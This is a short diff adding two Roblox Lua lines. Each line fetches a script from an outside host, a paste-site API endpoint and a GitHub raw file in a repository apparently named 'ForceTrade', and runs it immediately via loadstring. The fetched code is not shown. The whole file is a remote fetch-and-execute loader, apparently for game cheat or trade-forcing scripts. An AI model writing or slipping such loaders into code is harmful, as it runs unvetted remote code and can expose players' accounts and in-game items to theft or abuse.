@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/F2DfnR4NXAOAXFBF/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lutpiiiv2/ForceTrade/refs/heads/main/benhub"))()
